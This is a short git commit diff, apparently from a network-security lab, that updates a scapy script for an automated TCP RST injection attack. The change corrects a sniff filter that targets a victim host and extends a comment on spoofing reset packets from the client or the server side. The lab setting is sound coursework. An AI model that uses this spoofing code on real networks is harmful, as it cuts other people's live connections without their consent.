7e2c8b2cfbcabee99160444a0e58cd39d679c4b4
2dukes <ruipinto02@hotmail.com>
2022-04-03 13:42:11 +0100

    Fix: TCP attack wireshark capture and typos.

--- TCP_Attack/volumes/AutoRSTattack.py
+++ TCP_Attack/volumes/AutoRSTattack.py
@@ -8,10 +8,11 @@ def rstfunc(pkt):
     ls(pkt)
     send(pkt, verbose=0)
 
-f = "tcp and not ether src 02:42:fa:a7:22:45 and src dst 10.9.0.5" # Excluding our own generated packets and only considering destination as victim's IP.
+f = "tcp and not ether src 02:42:fa:a7:22:45 and dst host 10.9.0.5" # Excluding our own generated packets and only considering destination as victim's IP.
 pkt = sniff(iface="br-fa4ab2f34bed", filter=f, prn=rstfunc)
 
 '''
 Another approach that could be used, was to listen for ACKs sent by the victim to discover the SEQ number of the client's next message
-and then spoof a RST packet from the client to the server. Or vice-versa.
+and then spoof a RST packet from the client to the server. Or vice-versa. The RST packet can be send from both ends of the connection.
+In this script, also to simplify the understanding of the log, we only send a spoofed packet from the client.
 '''
